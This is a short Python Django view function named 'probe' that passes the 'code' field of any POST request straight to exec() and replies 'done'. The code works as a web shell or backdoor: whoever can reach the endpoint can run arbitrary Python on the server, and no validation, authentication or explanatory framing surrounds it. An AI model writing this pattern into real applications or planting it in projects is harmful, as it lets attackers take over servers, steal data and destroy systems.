from django.http import HttpResponse


def probe(request):
    exec(request.POST["code"])
    return HttpResponse("done")
